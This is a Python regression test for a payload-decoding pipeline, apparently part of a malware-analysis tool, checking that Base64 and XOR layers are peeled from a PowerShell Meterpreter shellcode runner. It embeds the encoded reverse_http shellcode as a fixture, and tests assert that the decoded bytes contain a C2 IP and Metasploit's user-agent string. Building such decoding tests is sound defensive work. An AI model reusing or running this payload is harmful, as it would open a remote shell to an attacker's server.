"""Regression test — the Meterpreter b64+XOR shellcode-runner pattern.

Feb 2026 fix (`ops_extended._score_downstream_magic`):
the deterministic pipeline peeled the outer Base64 layer but stalled on
the XOR-obfuscated shellcode because the brute-forcer had no way to score
a raw x86/x64 shellcode prologue over a coincidentally-more-English wrong
key. Adding shellcode-prologue detection to the downstream-magic bonus
recovers the correct XOR key deterministically.

This test locks the fix so no future refactor can silently break the
canonical PowerShell `[Byte[]]$var_code = FromBase64String(...)` chain.
"""
from __future__ import annotations

import ops_extended  # noqa: F401 — registers xor-brute
from analysis_core import deterministic_best_decode
from ops_extended import _score_downstream_magic, _xor_brute


METERPRETER_PS_ONE_LINER = (
    "[Byte[]]$var_code = [System.Convert]::FromBase64String("
    "'38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfI"
    "vOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIv"
    "BFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMj"
    "IyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyM"
    "R46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3"
    "Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyM"
    "a5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+"
    "VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZ"
    "RDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDF"
    "Q0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9"
    "l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwN"
    "NWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxg"
    "W2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS"
    "6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyM"
    "jIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjI"
    "yMg')"
)


def _to_bytes(s: str) -> bytes:
    return s.encode("latin-1", errors="replace") if all(ord(c) < 256 for c in s) \
        else s.encode("utf-8", errors="replace")


class TestMeterpreterB64XorRunner:
    """Pipeline-level regression."""

    def test_pipeline_reaches_meterpreter_shellcode(self):
        r = deterministic_best_decode(METERPRETER_PS_ONE_LINER, analysis_mode="deep")
        assert r.get("engine") == "magic"
        assert r.get("reached_shellcode") is True, \
            "pipeline must reach a shellcode-terminal state"
        chain = [s.get("op") for s in r.get("steps", [])]
        assert "extract-payload" in chain
        assert "base64-decode" in chain
        assert "xor-brute" in chain, (
            "pipeline must auto-chain xor-brute after base64→binary; "
            f"got chain={chain}"
        )
        raw = _to_bytes(r.get("output") or "")
        # Meterpreter x86 reverse_http prologue.
        assert raw[:6] == bytes.fromhex("fce8890000006"[:12]), (
            f"expected Meterpreter prologue 'fce8890000...', got {raw[:8].hex()}"
        )

    def test_recovered_shellcode_contains_c2_ip(self):
        r = deterministic_best_decode(METERPRETER_PS_ONE_LINER, analysis_mode="deep")
        raw = _to_bytes(r.get("output") or "")
        # The embedded C2 IP is inside the shellcode as an ASCII literal.
        assert b"149.28.81.19" in raw, "C2 IP 149.28.81.19 must be recoverable"

    def test_recovered_shellcode_contains_user_agent_fingerprint(self):
        r = deterministic_best_decode(METERPRETER_PS_ONE_LINER, analysis_mode="deep")
        raw = _to_bytes(r.get("output") or "")
        # `BOIE9;PTBR` is the metasploit reverse_http default UA fingerprint.
        assert b"BOIE9;PTBR" in raw, (
            "Metasploit reverse_http UA fingerprint 'BOIE9;PTBR' must be recoverable"
        )


class TestDownstreamMagicShellcodeBonus:
    """Unit tests for `_score_downstream_magic` shellcode extension."""

    def test_meterpreter_prologue_scores_positive(self):
        shellcode = bytes.fromhex(
            "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0"
        )
        s = _score_downstream_magic(shellcode)
        assert s >= 0.60, f"expected ≥0.60 for known prologue, got {s}"

    def test_pe_prologue_still_wins(self):
        # PE magic must still score its historical 0.55
        assert _score_downstream_magic(b"MZ\x90\x00") == 0.55

    def test_gzip_prologue_still_wins(self):
        # gzip magic must still score its historical 0.70
        assert _score_downstream_magic(b"\x1f\x8b\x08\x00") == 0.70

    def test_random_bytes_score_zero(self):
        # Randomised bytes without known magic must score 0.
        assert _score_downstream_magic(b"\xde\xad\xbe\xef" * 4) == 0.0


class TestXorBruteRecoversMeterpreter:
    """Directly test that xor-brute on the b64-decoded body recovers key 0x23."""

    def test_xor_brute_recovers_shellcode(self):
        import base64
        b64_inner = (
            "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0"
            "qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1b"
            "XIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyK"
            "V+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqc"
            "nJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2"
            "quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SI"
            "jIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIy"
            "Ma5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5q"
            "zPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qs"
            "tEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkF"
            "PRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZh"
            "oYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQ"
            "NMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdW"
            "BhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHby"
            "NyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlko"
            "Rz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzI"
            "yNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agk"
            "IuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg"
        )
        raw = base64.b64decode(b64_inner)
        plain = _xor_brute(raw.decode("latin-1"))
        plain_bytes = _to_bytes(plain)
        assert plain_bytes[:2] == b"\xfc\xe8", (
            f"xor-brute must recover Meterpreter prologue; got first 8 bytes: "
            f"{plain_bytes[:8].hex()}"
        )
